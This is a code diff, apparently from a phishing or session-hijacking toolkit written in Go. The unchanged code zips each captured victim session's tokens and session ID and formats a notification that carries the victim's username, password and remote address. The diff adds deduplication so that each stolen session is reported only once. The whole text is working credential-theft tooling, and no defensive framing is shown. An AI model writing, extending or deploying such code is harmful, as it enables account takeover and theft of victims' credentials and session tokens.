@@ -7,8 +7,13 @@ import (
 	"math/rand"
 	"os"
 	"path/filepath"
+	"sync"
 	"time"
 )
+
+// Define a map to store session IDs and a mutex for thread-safe access
+var processedSessions = make(map[string]bool)
+var mu sync.Mutex
 
 func generateRandomString() string {
 	rand.Seed(time.Now().UnixNano())
@@ -57,11 +62,11 @@ func createZipFile(session Session) (string, error) {
 
 	// Define the file names for each token
 	files := map[string][]byte{
-		"Tokens-" + generateRandomString() + ".txt":    tokensJSON,
+		"Tokens-" + generateRandomString() + ".txt":     tokensJSON,
 		"HTTPTokens-" + generateRandomString() + ".txt": httpTokensJSON,
 		"BodyTokens-" + generateRandomString() + ".txt": bodyTokensJSON,
 		"Custom-" + generateRandomString() + ".txt":     customJSON,
-		"SessionID-" + generateRandomString() + ".txt":   []byte(session.SessionID),
+		"SessionID-" + generateRandomString() + ".txt":  []byte(session.SessionID),
 	}
 
 	// Add each token as a text file to the zip
@@ -91,7 +96,7 @@ func formatSessionMessage(session Session) string {
 		"🌍 Remote Address:➖ %s\n"+
 		"🕒 Create Time:   ➖ %d\n"+
 		"🕔 Update Time:   ➖ %d\n"+
-		"\n" +
+		"\n"+
 		"📦 Token files are zipped and attached separately in message.\n",
 		session.Username,
 		session.Password,
@@ -109,6 +114,17 @@ func Notify(session Session) {
 		fmt.Println(err)
 		return
 	}
+	// Lock the mutex to safely access the map
+	mu.Lock()
+	if processedSessions[string(session.ID)] {
+		// If the session ID is already processed, skip sending notifications
+		fmt.Printf("Skipping duplicate notification for SessionID: %s\n", string(session.ID))
+		mu.Unlock()
+		return
+	}
+	// Mark the session ID as processed
+	processedSessions[string(session.ID)] = true
+	mu.Unlock()
 
 	// Format the session message
 	message := formatSessionMessage(session)
